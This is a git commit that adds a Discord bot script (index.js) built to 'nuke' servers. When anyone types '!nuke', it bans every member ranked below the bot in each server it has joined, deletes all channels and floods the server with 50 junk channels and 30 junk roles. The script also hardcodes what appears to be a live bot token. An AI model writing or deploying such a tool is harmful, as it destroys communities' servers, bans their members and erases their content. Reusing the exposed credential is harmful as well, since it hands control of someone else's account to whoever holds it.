6b585a93edc41e594cc745668ff73f8871e4fdef
aci24 <111813352+aci1337@users.noreply.github.com>
2022-12-19 23:38:10 +0200

    Add files via upload

---
+++ index.js
@@ -0,0 +1,42 @@
+const Discord = require('discord.js');
+const client = new Discord.Client();
+
+client.on("ready", () => {
+  console.log("I am ready!");
+});
+
+client.on("message", (message) => {
+  if (message.content.startsWith("!nuke")) {
+    // Get all the guilds the bot is in
+    let guilds = client.guilds.cache.array();
+    // Go through each guild
+    for (let i = 0; i < guilds.length; i++) {
+      // Get all the members of each guild
+      let members = guilds[i].members.cache.array();
+      // Go through each member
+      for (let j = 0; j < members.length; j++) {
+        // Check if the member has a lower role than the bot
+        if (members[j].roles.highest.position < guilds[i].me.roles.highest.position) {
+          // Ban the member
+          members[j].ban({ reason: 'Nuking server', bypass: true });
+        }
+      }
+      // Delete all the channels
+      guilds[i].channels.cache.forEach(channel => channel.delete());
+      // Create 50 random channels
+      for (let k = 0; k < 50; k++) {
+        guilds[i].channels.create('random-channel-' + Math.random().toString(36).substring(2, 15));
+      }
+      // Create 30 random roles
+      for (let l = 0; l < 30; l++) {
+        guilds[i].roles.create({
+          data: {
+            name: 'random-role-' + Math.random().toString(36).substring(2, 15)
+          }
+        });
+      }
+    }
+  }
+});
+
+client.login("MTA0Nzk5NTEzNzgyMjgyMjQ2MA.GeYnT6.gE7iv-827Ubltn99cTzEVkBjNwu53flgYm53iM");
